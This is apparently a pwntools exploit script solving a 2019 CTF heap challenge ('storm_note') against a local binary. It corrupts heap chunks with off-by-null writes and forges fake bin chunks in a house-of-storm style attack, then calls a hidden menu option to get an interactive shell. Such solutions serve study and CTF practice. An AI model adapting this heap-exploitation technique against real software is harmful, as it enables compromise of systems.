from pwn import *
p = process('./data/bin/heap23_23_xihu_2019_storm_note')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def add(size):
  p.recvuntil(b'Choice')
  p.sendline(b'1')
  p.recvuntil(b'?')
  p.sendline(str(size).encode())

def edit(idx,mes):
  p.recvuntil(b'Choice')
  p.sendline(b'2')
  p.recvuntil(b'?')
  p.sendline(str(idx).encode())
  p.recvuntil(b'Content')
  p.send(mes)

def dele(idx):
  p.recvuntil(b'Choice')
  p.sendline(b'3')
  p.recvuntil(b'?')
  p.sendline(str(idx).encode())

add(0x18);add(0x508);add(0x18);add(0x18);add(0x508);add(0x18);add(0x18)#step.1
edit(1,b'a'*0x4f0+p64(0x500));edit(4,b'a'*0x4f0+p64(0x500))#step.2
dele(1);edit(0,b'a'*0x18)#step.3
add(0x18);add(0x4d8)#step.4
dele(1);dele(2)#step.5
add(0x30);add(0x4e0)#step.6
dele(4)#step.7
edit(3,b'a'*0x18)#step.8
add(0x18);add(0x4d8)#step.9
dele(4);dele(5)#step.10
add(0x40);dele(2)    #step.11
add(0x4e8);dele(2) #step.12
content_addr = 0xabcd0100;fake_chunk = content_addr - 0x20;payload = p64(0)*2 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk);edit(7,payload)#step.13
payload2 = p64(0)*4 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5);edit(8,payload2)#step.14
add(0x40)#step.15
payload = p64(0) * 2+p64(0) * 6;edit(2,payload)#step.16
p.sendlineafter(b'Choice: ',b'666');p.send(p64(0)*6)#step.17
p.interactive()